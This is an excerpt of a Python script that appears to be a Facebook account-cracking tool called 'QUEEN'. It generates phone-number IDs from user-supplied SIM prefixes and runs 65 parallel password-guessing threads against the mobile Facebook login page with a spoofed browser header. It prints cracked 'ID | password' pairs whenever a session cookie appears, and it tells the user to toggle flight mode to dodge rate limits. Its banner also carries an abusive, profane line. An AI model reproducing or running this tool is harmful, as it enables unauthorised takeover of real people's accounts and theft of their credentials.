...
logo=("""\033[1;97m
 ...
 | |__| | |_| |  __/  __/ | | |
  \___\_\\__,_|\___|\___|_| |_|
                                                        ...
                                                        (Tricker)   
\033[1;93m--------------------------------------------------
\033[1;37m[-] OWNER     :\033[1;32m  PhsYco QueEn
\033[1;37m[-] GITHUB    :\033[1;32m  ZAINUsarkar
\033[1;37m[-] VERSION   :\033[1;32m       (1.3)
\033[1;37m[-] STATUS    :\033[1;32m       (FREE)
   👉😈 Ham Gaddar hen meri jan .......
	 Tum apni wafa utha ky apni maa kyy f***dy my dalo🙂💔
--------------------------------------------------""")
def linex():
	print('\033[0;97m--------------------------------------------------')
loop = 0
...
def fia():    
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/QUEEN-.txt')
				linex()
...
def mmm(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHONA:
				print('\33[38;5;208m[QUEEN-CP] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[QUEEN-OK] '+ids+' | '+pas+'\033[0;92m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHONA:
				...
				print('\r\r\033[0;92m[QUEEN-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\33[38;5;208m[QUEEN-CP] '+ids+' | '+pas+'\033[1;97m')
...
def random_number3():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :92318,92345,92323,92319,92306.ETC')
	linex()
	kode = input('[+]\033[0;92m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		print('[*] Total Acounts : '+tl)
		print('[+] Ypur Select Code : '+kode)
		print('\x1b[1;91m[*] If You No Result Use Flight Mode In Every 3 Sec ')
		linex()
		for guru in uid:
			uid = kode+guru
...
def fcrack(uid,pwx,tl):
    ...
    'dpr': '2.75',
    'referer': 'https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&wtsid=rdr_0Yu3KH0g4Au4pYZP2&_rdr',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\x1b[1;92m[QUEEN-OK] '+cid+' | '+ps+'\033[0;97m')
